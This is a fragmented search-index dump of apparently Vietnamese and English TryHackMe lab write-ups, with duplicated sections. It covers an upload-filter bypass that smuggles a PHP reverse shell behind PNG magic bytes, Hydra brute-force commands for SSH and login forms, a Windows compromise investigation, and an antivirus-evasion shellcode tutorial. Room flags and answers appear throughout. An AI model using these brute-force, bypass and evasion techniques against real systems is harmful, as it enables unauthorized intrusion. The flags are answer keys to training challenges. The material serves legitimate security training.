: TLS randomness does not represent time | tls-alpn : | _ http / 1 . 1 | _http-title : 400 Bad Request C\u00e1i kh\u00f3 ch\u1ed7 n\u00e0y l\u00e0 trang c\u00f3 port 443 cho service https. V\u00e0 \u0111\u00e3 \u0111\u01b0\u1ee3c sign n\u00ean ta s\u1ebd kh\u00f4ng scan dir \u0111\u01b0\u1ee3c. Ta ph\u1ea3i config hostname v\u00e0o file /etc/hosts /etc/hosts 10 . 10 . 216 . 13 grep . thm \u0110\u1ec3 \u00fd \u0111o\u1ea1n scan nmap c\u00f3 d\u00f2ng ...commonName=grep.thm... n\u00ean s\u1ebd config theo t\u00ean n\u00e0y. Ti\u1ebfp theo, scan gobuster, d\u00f9ng c\u00e1c k\u0129 thu\u1eadt th\u0103m d\u00f2 nh\u01b0 F12,... ta s\u1ebd \u0111\u01b0\u1ee3c th\u1ee9 trong h\u00ecnh b\u00ean d\u01b0\u1edbi Ta nh\u1eadn \u0111\u01b0\u1ee3c API-KEY nh\u01b0ng submit l\u1ea1i b\u1ecb l\u1ed7i (register c\u0169ng b\u1ecb l\u1ed7i th\u00f4ng b\u00e1o key h\u1ebft h\u1ea1n ho\u1eb7c sai key). Hashid cho ta bi\u1ebft key d\u00f9ng MD5. Sau khi decrypt ta \u0111\u01b0\u1ee3c johncena . Search gg c\u00e1c ki\u1ec3u ch\u1ea3 ra g\u00ec Nh\u1eadn th\u1ea5y r\u1eb1ng trang web c\u00f3 SearchMe. Ta ti\u1ebfp t\u1ee5c t\u00ecm ki\u1ebfm b\u1eb1ng github th\u00ec ra \u0111\u01b0\u1ee3c repo b\u00ean d\u01b0\u1edbi Sau m\u1ed9t v\u00e0i thao t\u00e1c \u0111i\u1ec1u tra, ta \u0111\u00e3 l\u1ea5y \u0111\u01b0\u1ee3c API-Key Ti\u1ebfn h\u00e0nh register account v\u00e0 login \u0111\u1ec3 nh\u1eadn first flag. Ti\u1ebfp t\u1ee5c t\u1edbi trang upload Nh\u1eadn th\u1ea5y r\u1eb1ng trang upload h\u1ecd filter b\u1eb1ng $allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp']; Nh\u01b0ng v\u1ea5n \u0111\u1ec1 \u1edf \u0111\u00e2y l\u00e0 filter v\u1ec1 m\u1eb7t m\u00e3 hex c\u1ee7a file (ch\u1ee9 kh\u00f4ng ph\u1ea3i filter theo d\u1ea1ng l\u1ea5y extension ra so s\u00e1nh). Ta s\u1ebd t\u1ea1o reverse shell v\u1edbi t\u00ean file l\u00e0 script.php nh\u01b0ng thay \u0111\u1ed5i th\u00f4ng s\u1ed1 magic number 89 50 4E 47 0D 0A 1A 0A Xem link https://en.wikipedia.org/wiki/List_of_file_signatures ho\u1eb7c xem h\u00ecnh b\u00ean d\u01b0\u1edbi Magic number for png file V\u00e0 ta th\u00e0nh th\u00f4ng trong vi\u1ec7c th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng","title":"Reconnaissance"},{"location":"tryhackme/room/greprtp/#init-access","text":"Ti\u1ebfp t\u1ee5c OSINT, ta \u0111\u01b0\u1ee3c th\u00f4ng tin account admin trong folder backup D\u00f9ng john \u0111\u1ec3 gi\u1ea3i m\u00e3 password m\u00e3i th\u00ec kh\u00f4ng \u0111\u01b0\u1ee3c. Xem x\u00e9t ti\u1ebfp ta th\u1ea5y trong h\u1ec7 th\u1ed1ng t\u1ed3n t\u1ea1i m\u1ed9t folder leakchecker \u0111\u00e3 sign - th\u00ec \u0111\u00e2y l\u00e0 1 subdomain c\u1ee7a grep.thm Ti\u1ebfp t\u1ee5c \u0111em n\u00f3 v\u00e0o file /etc/hosts Ta \u0111\u01b0\u1ee3c password c\u1ee7a user admin Th\u1ef1c ra th\u00ec ban \u0111\u1ea7u b\u01b0\u1edbc scan nmap v\u1eabn c\u00f2n 1 port \u1ea9n l\u00e0 51337 d\u00e0nh cho subdomain n\u00e0y. T\u00f4i c\u00f3 t\u00ecnh kh\u00f4ng \u0111\u1ec3 \u1edf ph\u1ea7n scan tr\u01b0\u1edbc \u0111\u1ec3 nh\u1eb1m hidden n\u00f3, \u0111\u1ebfn l\u00fac n\u00e0y m\u1edbi \u0111em ra :3 51337 / tcp open http Apache httpd 2 . 4 . 41 | _http-server-header : Apache / 2 . 4 . 41 ( Ubuntu ) | _http-title : 400 Bad Request H\u01a1n th\u1ebf n\u1eefa, b\u1ea3n ch\u1ea5t \u0111\u00e2y l\u00e0 port cho http c\u00f3 h\u1ed7 tr\u1ee3 ssl. Nh\u01b0ng ta s\u1ebd nh\u1eadn \u0111\u01b0\u1ee3c th\u00f4ng b\u00e1o Your browser sent a request that this server could not understand. Reason: You're speaking plain HTTP to an SSL-enabled server port. Instead use the HTTPS scheme to access this URL, please. n\u1ebfu truy c\u1eadp b\u1eb1ng http v\u00ec \u0111\u1ec3 truy c\u1eadp http c\u00f3 h\u1ed7 tr\u1ee3 ssl nh\u01b0 n\u00e0y, ta ph\u1ea3i d\u00f9ng https thay th\u1ebf.","title":"Init Access"},{"location":"tryhackme/room/greprtp/#what-we-learned","text":"Config DNS Server through hosts file Config DNS Server through hosts file :3 Bypass file extensions by using magic numbers","title":"What we learned"},{"location":"tryhackme/room/hydra/","tags":["THM-Room"],"text":"Hydra \u00b6 Task 1: Hydra Introduction \u00b6 What is Hydra? \u00b6 Hydra is a brute force online password cracking program, a quick system login password \u201chacking\u201d tool. Hydra can run through a list and \u201cbrute force\u201d some authentication services. Imagine trying to manually guess someone\u2019s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password. According to its official repository , Hydra supports, i.e., has the ability to brute force the following protocols: \u201cAsterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.\u201d For more information on the options of each protocol in Hydra, you can check the Kali Hydra tool page . This shows the importance of using a strong password; if your password is common, doesn\u2019t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use admin:password as the default login credentials, which is obviously not strong enough. Installing Hydra \u00b6 Hydra is already installed on the AttackBox. You can access it by clicking on the Start AttackBox button. If you prefer to use the in-browser Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions. You can access it by selecting Use Kali Linux and clicking on Start Kali Linux button. However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing apt install hydra or dnf install hydra . Furthermore, you can download it from its official THC-Hydra repository . Task 2: Using Hydra \u00b6 Deploy the machine attached to this task, then navigate to http://MACHINE_IP (this machine can take up to 3 minutes to boot) Hydra Commands \u00b6 The options we pass into Hydra depend on which service (protocol) we\u2019re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we\u2019d use the following command: hydra -l user -P passlist.txt ftp://MACHINE_IP For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method). SSH \u00b6 hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh Option Description -l specifies the (SSH) username for login -P indicates a list of passwords -t sets the number of threads to spawn For example, hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh will run with the following arguments: Hydra will use root as the username for ssh It will try the passwords in the passwords.txt file There will be four threads running in parallel as indicated by -t 4 Post Web Form \u00b6 We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser\u2019s network tab (in developer tools) to see the request types or view the source code. sudo hydra <username> <wordlist> MACHINE_IP http-post-form \"<path>:<login_credentials>:<invalid_response>\" Option Description -l the username for (web form) login -P the password list to use http-post-form the type of the form is POST <path> the login page URL, for example, login.php <login_credentials> the username and password used to log in, for example, username=^USER^&password=^PASS^ <invalid_response> part of the response when the login fails -V verbose output for every attempt Below is a more concrete example Hydra command to brute force a POST login form: hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V The login page is only / , i.e., the main IP address. The username is the form field where the username is entered The specified username(s) will replace ^USER^ The password is the form field where the password is entered The provided passwords will be replacing ^PASS^ Finally, F=incorrect is a string that appears in the server reply when the login fails You should now have enough information to put this to practice and brute force your credentials to the deployed machine! Answer the questions bellow \u00b6 Question: Use Hydra to bruteforce molly's web password. What is flag 1? Ans: THM{2673a7dd116de68e85c48ec0b1f2612e} Use Hydra to bruteforce molly's SSH password. What is flag 2? Ans: THM{c8eeb0468febbadea859baeb33b2541b}","title":"Hydra"},{"location":"tryhackme/room/hydra/#hydra","text":"","title":"Hydra"},{"location":"tryhackme/room/hydra/#task-1-hydra-introduction","text":"","title":"Task 1: Hydra Introduction"},{"location":"tryhackme/room/hydra/#what-is-hydra","text":"Hydra is a brute force online password cracking program, a quick system login password \u201chacking\u201d tool. Hydra can run through a list and \u201cbrute force\u201d some authentication services. Imagine trying to manually guess someone\u2019s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password. According to its official repository , Hydra supports, i.e., has the ability to brute force the following protocols: \u201cAsterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.\u201d For more information on the options of each protocol in Hydra, you can check the Kali Hydra tool page . This shows the importance of using a strong password; if your password is common, doesn\u2019t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use admin:password as the default login credentials, which is obviously not strong enough.","title":"What is Hydra?"},{"location":"tryhackme/room/hydra/#installing-hydra","text":"Hydra is already installed on the AttackBox. You can access it by clicking on the Start AttackBox button. If you prefer to use the in-browser Kali machine, Hydra also comes pre-installed, as is the case with all Kali distributions. You can access it by selecting Use Kali Linux and clicking on Start Kali Linux button. However, you can check its official repositories if you prefer to use another Linux distribution. For instance, you can install Hydra on an Ubuntu or Fedora system by executing apt install hydra or dnf install hydra . Furthermore, you can download it from its official THC-Hydra repository .","title":"Installing Hydra"},{"location":"tryhackme/room/hydra/#task-2-using-hydra","text":"Deploy the machine attached to this task, then navigate to http://MACHINE_IP (this machine can take up to 3 minutes to boot)","title":"Task 2: Using Hydra"},{"location":"tryhackme/room/hydra/#hydra-commands","text":"The options we pass into Hydra depend on which service (protocol) we\u2019re attacking. For example, if we wanted to brute force FTP with the username being user and a password list being passlist.txt, we\u2019d use the following command: hydra -l user -P passlist.txt ftp://MACHINE_IP For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).","title":"Hydra Commands"},{"location":"tryhackme/room/hydra/#ssh","text":"hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh Option Description -l specifies the (SSH) username for login -P indicates a list of passwords -t sets the number of threads to spawn For example, hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh will run with the following arguments: Hydra will use root as the username for ssh It will try the passwords in the passwords.txt file There will be four threads running in parallel as indicated by -t 4","title":"SSH"},{"location":"tryhackme/room/hydra/#post-web-form","text":"We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser\u2019s network tab (in developer tools) to see the request types or view the source code. sudo hydra <username> <wordlist> MACHINE_IP http-post-form \"<path>:<login_credentials>:<invalid_response>\" Option Description -l the username for (web form) login -P the password list to use http-post-form the type of the form is POST <path> the login page URL, for example, login.php <login_credentials> the username and password used to log in, for example, username=^USER^&password=^PASS^ <invalid_response> part of the response when the login fails -V verbose output for every attempt Below is a more concrete example Hydra command to brute force a POST login form: hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V The login page is only / , i.e., the main IP address. The username is the form field where the username is entered The specified username(s) will replace ^USER^ The password is the form field where the password is entered The provided passwords will be replacing ^PASS^ Finally, F=incorrect is a string that appears in the server reply when the login fails You should now have enough information to put this to practice and brute force your credentials to the deployed machine!","title":"Post Web Form"},{"location":"tryhackme/room/hydra/#answer-the-questions-bellow","text":"Question: Use Hydra to bruteforce molly's web password. What is flag 1? Ans: THM{2673a7dd116de68e85c48ec0b1f2612e} Use Hydra to bruteforce molly's SSH password. What is flag 2? Ans: THM{c8eeb0468febbadea859baeb33b2541b}","title":"Answer the questions bellow"},{"location":"tryhackme/room/ignite/","tags":["THM-Room","Privilege Escalation"],"text":"Ignite \u00b6 Root at: https://tryhackme.com/room/ignite Task 1: Root it \u00b6 User flag 6470e394cbf6dab6a91682cc8585059b Root flag b9bbcb33e11b80be759c4e844862482d Hint B\u1ea1n bi\u1ebft g\u00ec v\u1ec1 fuel CMS 1.4.1","title":"Ignite"},{"location":"tryhackme/room/ignite/#ignite","text":"Root at: https://tryhackme.com/room/ignite","title":"Ignite"},{"location":"tryhackme/room/ignite/#task-1-root-it","text":"User flag 6470e394cbf6dab6a91682cc8585059b Root flag b9bbcb33e11b80be759c4e844862482d Hint B\u1ea1n bi\u1ebft g\u00ec v\u1ec1 fuel CMS 1.4.1","title":"Task 1: Root it"},{"location":"tryhackme/room/intro-c2/","tags":["THM-Room"],"text":"TryHackMe - Intro to C2 \u00b6 Task 1: Introduction \u00b6","title":"TryHackMe - Intro to C2"},{"location":"tryhackme/room/intro-c2/#tryhackme-intro-to-c2","text":"","title":"TryHackMe - Intro to C2"},{"location":"tryhackme/room/intro-c2/#task-1-introduction","text":"","title":"Task 1: Introduction"},{"location":"tryhackme/room/investigatingwindows/","tags":["THM-Room","Investigating Windows"],"text":"Investigating Windows \u00b6 Room: https://tryhackme.com/room/investigatingwindows Task 1: Investigating Windows \u00b6 This is a challenge that is exactly what is says on the tin, there are a few challenges around investigating a windows machine that has been previously compromised. Connect to the machine using RDP. The credentials the machine are as follows: Username: Administrator Password: letmein123! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. Answer the questions bellow \u00b6 Whats the version and year of the windows machine? windows server 2016 Hint systeminfo Which user logged in last? Administrator Hint get-localuser | select * get-localuser | select name, lastlogon When did John log onto the system last? 03/02/2019 5:48:32 PM Hint get-localuser | select * get-localuser | select name, lastlogon What IP does the system connect to when it first starts? 10.34.2.3 What two accounts had administrative privileges (other than the Administrator user)? Jenny, Guest Hint D\u00f9ng tool computer management Alt text Whats the name of the scheduled task that is malicous. clean file system Hint D\u00f9ng task scheduler Alt text What file was the task trying to run daily? nc.ps1 What port did this file listen locally for? 1348 When did Jenny last logon? never Hint net user jenny At what date did the compromise take place? 03/02/2019 Hint File in folder C:\\TMP Alt text During the compromise, at what time did Windows first assign special privileges to a new logon? 02/03/2019 4:04:49 PM Hint Xem event viewer Alt text","title":"Investigating Windows"},{"location":"tryhackme/room/investigatingwindows/#investigating-windows","text":"Room: https://tryhackme.com/room/investigatingwindows","title":"Investigating Windows"},{"location":"tryhackme/room/investigatingwindows/#task-1-investigating-windows","text":"This is a challenge that is exactly what is says on the tin, there are a few challenges around investigating a windows machine that has been previously compromised. Connect to the machine using RDP. The credentials the machine are as follows: Username: Administrator Password: letmein123! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.","title":"Task 1: Investigating Windows"},{"location":"tryhackme/room/investigatingwindows/#answer-the-questions-bellow","text":"Whats the version and year of the windows machine? windows server 2016 Hint systeminfo Which user logged in last? Administrator Hint get-localuser | select * get-localuser | select name, lastlogon When did John log onto the system last? 03/02/2019 5:48:32 PM Hint get-localuser | select * get-localuser | select name, lastlogon What IP does the system connect to when it first starts? 10.34.2.3 What two accounts had administrative privileges (other than the Administrator user)? Jenny, Guest Hint D\u00f9ng tool computer management Alt text Whats the name of the scheduled task that is malicous. clean file system Hint D\u00f9ng task scheduler Alt text What file was the task trying to run daily? nc.ps1 What port did this file listen locally for? 1348 When did Jenny last logon? never Hint net user jenny At what date did the compromise take place? 03/02/2019 Hint File in folder C:\\TMP Alt text During the compromise, at what time did Windows first assign special privileges to a new logon? 02/03/2019 4:04:49 PM Hint Xem event viewer Alt text","title":"Answer the questions bellow"},{"location":"tryhackme/room/l/","text":"Room \u00b6 Introduction to Antivirus AV Evasion - Shellcode Firewalls Network Security Solutions Kenobi","title":"Room"},{"location":"tryhackme/room/l/#room","text":"Introduction to Antivirus AV Evasion - Shellcode Firewalls Network Security Solutions Kenobi","title":"Room"},{"location":"tryhackme/room/l/vi/","text":"Answer the questions bellow Question: Which Antivirus software is running on the VM? Ans: name Task 4: Evasion via Forcing Fragmentation, MTU, and Data Length","title":"Vi"},{"location":"tryhackme/room/l/avevasionshellcode/","text":"AV Evasion - Shellcode \u00b6 Room at https://tryhackme.com/room/avevasionshellcode Task 1: Introduction \u00b6 In this room, we'll explore how to build and deliver payloads, focusing on avoiding detection by common AV engines. We'll look at different techniques available to us as attackers and discuss the pros and cons of every one of them. Objectives \u00b6 Learn how shellcodes are made. Explore the pros and cons of staged payloads. Create stealthy shellcodes to avoid AV detection. Prerequisites \u00b6 It is recommended to have some prior knowledge of how antivirus software works and a basic understanding of encryption and encoding. While not strictly required, some knowledge of basic assembly language can also be helpful. Also, we recommend having a basic understanding of reading code and understanding functions (C, C#). Task 2: Challenge \u00b6 In this challenge, we prepared a Windows machine with a web application to let you upload your payloads. Once uploaded, the payloads will be checked by an AV and executed if found to be clean of malware. The main goal of this challenge is to evade Antivirus software installed on the VM and capture the flag in the file system. Feel free to try all of the techniques discussed throughout the room by uploading them to http://MACHINE_IP/ . Points to remember: Try to combine the techniques discussed in this room. The website supports EXE files only. Once the AV scans the uploaded file and no malicious code is detected, the file gets executed. Thus, if everything is put together correctly, then you should receive a reverse shell. You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell. Deploy the attached VM to follow up with the content of the room before continuing to the next section! The VM will deploy in-browser and should appear automatically in the Split View. In case the VM is not visible, use the blue Show Split View button at the top-right of the page. If you prefer connecting via RDP, you can do so with the following credentials: Username: thm Password: Password321 You will also need the AttackBox for some tasks, so this is also a good moment to start it. Answer the questions bellow Question: Which Antivirus software is running on the VM? Ans: name Question: What is the name of the user account to which you have access? Ans: Question: Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag? Ans: Task 3: PE Structure \u00b6 This task highlights some of the high-level essential elements of PE data structure for Windows binaries. What is PE? \u00b6 Windows Executable file format, aka PE (Portable Executable), is a data structure that holds information necessary for files. It is a way to organize executable file code on a disk. Windows operating system components, such as Windows and DOS loaders, can load it into memory and execute it based on the parsed file information found in the PE. In general, the default file structure of Windows binaries, such as EXE, DLL, and Object code files, has the same PE structure and works in the Windows operating system for both (x86 and x64) CPU architecture. A PE structure contains various sections that hold information about the binary, such as metadata and links to a memory address of external libraries. One of these sections is the PE Header , which contains metadata information, pointers, and links to address sections in memory. Another section is the Data section , which includes containers that include the information required for the Windows loader to run a program, such as the executable code, resources, links to libraries, data variables, etc. There are different types of data containers in the PE structure, each holding different data. .text stores the actual code of the program .data holds the initialized and defined variables .bss holds the uninitialized data (declared variables with no assigned values) .rdata contains the read-only data .edata : contains exportable objects and related table information .idata imported objects and related table information .reloc image relocation information .rsrc links external resources used by the program such as images, icons, embedded binaries, and manifest file, which has all information about program versions, authors, company, and copyright! The PE structure is a vast and complicated topic, and we are not going to go into too much detail regarding the headers and data sections. This task provides a high-level overview of the PE structure. If you are interested in gaining more information on the topic, we suggest checking the following THM rooms where the topic is explained in greater detail: Windows Internals Dissecting PE Headers You can also get more in-depth details about PE if you check the Windows PE format's Docs website. When looking at the PE contents, we'll see it contains a bunch of bytes that aren't human-readable. However, it includes all the details the loader needs to run the file. The following are the example steps in which the Windows loader reads an executable binary and runs it as a process. Header sections: DOS, Windows, and optional headers are parsed to provide information about the EXE file. For example, The magic number starts with \"MZ,\" which tells the loader that this is an EXE file. File Signatures Whether the file is compiled for x86 or x64 CPU architecture. Creation timestamp. Parsing the section table details, such as Number of Sections the file contains. Mapping the file contents into memory based on The EntryPoint address and the offset of the ImageBase. RVA: Relative Virtual Address, Addresses related to Imagebase. Imports, DLLs, and other objects are loaded into the memory. The EntryPoint address is located and the main execution function runs. Why do we need to know about PE? \u00b6 There are a couple of reasons why we need to learn about it. First, since we are dealing with packing and unpacking topics, the technique requires details about the PE structure. The other reason is that AV software and malware analysts analyze EXE files based on the information in the PE Header and other PE sections. Thus, to create or modify malware with AV evasion capability targeting a Windows machine, we need to understand the structure of Windows Portable Executable files and where the malicious shellcode can be stored. We can control in which Data section to store our shellcode by how we define and initialize the shellcode variable. The following are some examples that show how we can store the shellcode in PE: Defining the shellcode as a local variable within the main function will store it in the .TEXT PE section. Defining the shellcode as a global variable will store it in the .Data section. Another technique involves storing the shellcode as a raw binary in an icon image and linking it within the code, so in this case, it shows up in the .rsrc Data section. We can add a custom data section to store the shellcode. PE-Bear \u00b6 The attached VM is a Windows development machine that has the tools needed to parse EXE files and read the details we discussed. For your convenience, we have provided a copy of the PE-Bear software on the Desktop, which helps to check the PE structure: Headers, Sections, etc. PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, select File -> Load PEs (Ctrl + O). Once a file is loaded, we can see all PE details. The following screenshot shows PE details of the loaded file, including the headers and sections we discussed earlier in this task. Now it is time to try it out! Load the thm-intro2PE.exe file to answer the questions below. The file is located in the following location: c:\\Tools\\PE files\\thm-intro2PE.exe Answer the questions bellow Question: What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? Ans: 530949 Question: What is the Magic number value of the thm-intro2PE.exe file (in Hex)? Ans: 5A4D Question: What is the Entry Point value of the thm-intro2PE.exe file? Ans: 12E4 Question: How many Sections does the thm-intro2PE.exe file have? Ans: 7 Question: A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section? Ans: .flag Question: Check the content of the extra section. What is the flag? Ans: THM{PE-N3w-s3ction!} Task 4: Introduction to Shellcode \u00b6 Shellcode is a set of crafted machine code instructions that tell the vulnerable program to run additional functions and, in most cases, provide access to a system shell or create a reverse command shell. Once the shellcode is injected into a process and executed by the vulnerable software or program, it modifies the code run flow to update registers and functions of the program to execute the attacker's code. It is generally written in Assembly language and translated into hexadecimal opcodes (operational codes). Writing unique and custom shellcode helps in evading AV software significantly. But writing a custom shellcode requires excellent knowledge and skill in dealing with Assembly language, which is not an easy task! A Simple Shellcode! \u00b6 In order to craft your own shellcode, a set of skills is required: A decent understanding of x86 and x64 CPU architectures. Assembly language. Strong knowledge of programming languages such as C. Familiarity with the Linux and Windows operating systems. To generate our own shellcode, we need to write and extract bytes from the assembler machine code. For this task, we will be using the AttackBox to create a simple shellcode for Linux that writes the string \"THM, Rocks!\". The following assembly code uses two main functions: System Write function (sys_write) to print out a string we choose. System Exit function (sys_exit) to terminate the execution of the program. To call those functions, we will use syscalls . A syscall is the way in which a program requests the kernel to do something. In this case, we will request the kernel to write a string to our screen, and the exit the program. Each operating system has a different calling convention regarding syscalls, meaning that to use the write in Linux, you'll probably use a different syscall than the one you'd use on Windows. For 64-bits Linux, you can call the needed functions from the kernel by setting up the following values: rax System Call rdi rsi rdx 0x1 sys_write unsigned int fd const char *buf size_t count 0x3c sys_exit int error_code The table above tells us what values we need to set in different processor registers to call the sys_write and sys_exit functions using syscalls. For 64-bits Linux, the rax register is used to indicate the function in the kernel we wish to call. Setting rax to 0x1 makes the kernel execute sys_write, and setting rax to 0x3c will make the kernel execute sys_exit. Each of the two functions require some parameters to work, which can be set through the rdi, rsi and rdx registers. You can find a complete reference of available 64-bits Linux syscalls here . For sys_write , the first parameter sent through rdi is the file descriptor to write to. The second parameter in rsi is a pointer to the string we want to print, and the third in rdx is the size of the string to print. For sys_exit , rdi needs to be set to the exit code for the program. We will use the code 0, which means the program exited successfully. Copy the following code to your AttackBox in a file called thm.asm : global _start section .text _start: jmp MESSAGE ; 1) let's jump to MESSAGE GOBACK: mov rax , 0x1 mov rdi , 0x1 pop rsi ; 3) we are popping into `rsi`; now we have the ; address of \"THM, Rocks!\\r\\n\" mov rdx , 0xd syscall mov rax , 0x3c mov rdi , 0x0 syscall MESSAGE: call GOBACK ; 2) we are going back, since we used `call`, that means ; the return address, which is, in this case, the address ; of \"THM, Rocks!\\r\\n\", is pushed into the stack. db \" THM , Rocks ! \" , 0 dh , 0 ah Let's explain the ASM code a bit more. First, our message string is stored at the end of the .text section. Since we need a pointer to that message to print it, we will jump to the call instruction before the message itself. When call GOBACK is executed, the address of the next instruction after call will be pushed into the stack, which corresponds to where our message is. Note that the 0dh, 0ah at the end of the message is the binary equivalent to a new line (\\r\\n). Next, the program starts the GOBACK routine and prepares the required registers for our first sys_write() function. We specify the sys_write function by storing 1 in the rax register. We set rdi to 1 to print out the string to the user's console (STDOUT). We pop a pointer to our string, which was pushed when we called GOBACK and store it into rsi. With the syscall instruction, we execute the sys_write function with the values we prepared. For the next part, we do the same to call the sys_exit function, so we set 0x3c into the rax register and call the syscall function to exit the program. Next, we compile and link the ASM code to create an x64 Linux executable file and finally execute the program. Assembler and link our code user @AttackBox $ nasm -f elf64 thm . asm user @AttackBox $ ld thm . o -o thm user @AttackBox $ ./ thm THM , Rocks ! We used the nasm command to compile the asm file, specifying the -f elf64 option to indicate we are compiling for 64-bits Linux. Notice that as a result we obtain a .o file, which contains object code, which needs to be linked in order to be a working executable file. The ld command is used to link the object and obtain the final executable. The -o option is used to specify the name of the output executable file. Now that we have the compiled ASM program, let's extract the shellcode with the objdump command by dumping the .text section of the compiled binary. Dump the .text section user @AttackBox $ objdump -d thm thm : file format elf64-x86 - 64 Disassembly of section . text : 0000000000400080 < _start >: 400080 : eb 1e jmp 4000a0 0000000000400082 : 400082 : b8 01 00 00 00 mov $0x1 , % eax 400087 : bf 01 00 00 00 mov $0x1 , % edi 40008c : 5e pop % rsi 40008d : ba 0d 00 00 00 mov $0xd , % edx 400092 : 0f 05 syscall 400094 : b8 3c 00 00 00 mov $0x3c , % eax 400099 : bf 00 00 00 00 mov $0x0 , % edi 40009e : 0f 05 syscall 00000000004000a0 : 4000a0 : e8 dd ff ff ff callq 400082 4000a5 : 54 push % rsp 4000a6 : 48 rex . W 4000a7 : 4d 2c 20 rex . WRB sub $0x20 , % al 4000aa : 52 push % rdx 4000ab : 6f outsl % ds :( % rsi ),( % dx ) 4000ac : 63 6b 73 movslq 0x73 ( % rbx ), % ebp 4000af : 21 . byte 0x21 4000b0 : 0d . byte 0xd 4000b1 : 0a . byte 0xa Now we need to extract the hex value from the above output. To do that, we can use objcopy to dump the .text section into a new file called thm.text in a binary format as follows: Extract the .text section user @AttackBox $ objcopy -j . text -O binary thm thm . text The thm.text contains our shellcode in binary format, so to be able to use it, we will need to convert it to hex first. The xxd command has the -i option that will output the binary file in a C string directly: Output the hex equivalent to our shellcode user @AttackBox $ xxd -i thm . text unsigned char new_text [] = { 0xeb , 0x1e , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0x5e , 0xba , 0x0d , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xdd , 0xff , 0xff , 0xff , 0x54 , 0x48 , 0x4d , 0x2c , 0x20 , 0x52 , 0x6f , 0x63 , 0x6b , 0x73 , 0x21 , 0x0d , 0x0a }; unsigned int new_text_len = 50 ; Finally, we have it, a formatted shellcode from our ASM assembly. That was fun! As we see, dedication and skills are required to generate shellcode for your work! To confirm that the extracted shellcode works as we expected, we can execute our shellcode and inject it into a C program. #include <stdio.h> int main ( int argc , char ** argv ) { unsigned char message [] = { 0xeb , 0x1e , 0xb8 , 0x01 , 0x00 , 0x00 , 0x00 , 0xbf , 0x01 , 0x00 , 0x00 , 0x00 , 0x5e , 0xba , 0x0d , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xb8 , 0x3c , 0x00 , 0x00 , 0x00 , 0xbf , 0x00 , 0x00 , 0x00 , 0x00 , 0x0f , 0x05 , 0xe8 , 0xdd , 0xff , 0xff , 0xff , 0x54 , 0x48 , 0x4d , 0x2c , 0x20 , 0x52 , 0x6f , 0x63 , 0x6b , 0x73 , 0x21 , 0x0d , 0x0a }; ( * ( void ( * )()) message )(); return 0 ; } Then, we compile and execute it as follows, Compiler our C program user @AttackBox $ gcc -g -Wall -z execstack thm . c -o thmx user @AttackBox $ ./ thmx THM , Rocks ! Nice! it works. Note that we compile the C 